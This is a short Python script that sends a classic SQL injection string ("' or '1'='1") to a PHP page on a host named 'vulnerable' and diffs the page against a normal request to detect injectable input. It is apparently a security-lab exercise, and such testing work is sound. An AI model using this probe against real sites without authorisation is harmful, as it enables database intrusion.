import urllib.parse
import urllib.request
import difflib

# specify URL to connect to
base_url = "http://vulnerable/sqli/example1.php?{}"

args = {"name":"root"}

url = base_url.format(urllib.parse.urlencode(args))


with urllib.request.urlopen(url) as u:
	gen_content = list(u.read().decode("utf-8").split('\n'))


name = "root"
fuzz_string = "\' or \'1\'=\'1"
args["name"] = name + fuzz_string
url = base_url.format(urllib.parse.urlencode(args))

with urllib.request.urlopen(url) as u:
	fuzz_content = list(u.read().decode("utf-8").split('\n'))

# compare the responses
diff_list = difflib.context_diff(gen_content, fuzz_content)

diff = ""
for e in diff_list:
	diff += e

